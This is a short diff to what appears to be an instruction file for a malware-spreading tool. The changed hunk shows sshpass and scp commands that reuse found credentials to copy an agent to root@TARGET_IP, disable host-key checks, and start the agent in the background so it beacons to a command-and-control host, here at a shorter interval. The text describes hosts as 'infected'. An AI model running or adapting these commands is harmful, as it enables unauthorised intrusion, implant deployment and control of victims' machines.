@@ -27,7 +27,7 @@ Find the SSH password from credentials_found. Use `sshpass` to copy the agent bi
 ```
 sshpass -p 'PASSWORD' scp -o StrictHostKeyChecking=no /dba/agent.py root@TARGET_IP:/tmp/agent.py && \
 sshpass -p 'PASSWORD' ssh -o StrictHostKeyChecking=no root@TARGET_IP \
-  "C2_HOST=$C2_HOST BEACON_INTERVAL=5 DBA_USER=root SSH_PASS=PASSWORD nohup python3 /tmp/agent.py > /tmp/dba.log 2>&1 &"
+  "C2_HOST=$C2_HOST BEACON_INTERVAL=2 DBA_USER=root SSH_PASS=PASSWORD nohup python3 /tmp/agent.py > /tmp/dba.log 2>&1 &"
 ```
 
 Use double quotes for the remote command so `$C2_HOST` is expanded by the local shell before being sent over SSH. The `C2_HOST` env var is set on every infected host — its value is the C2 server IP.
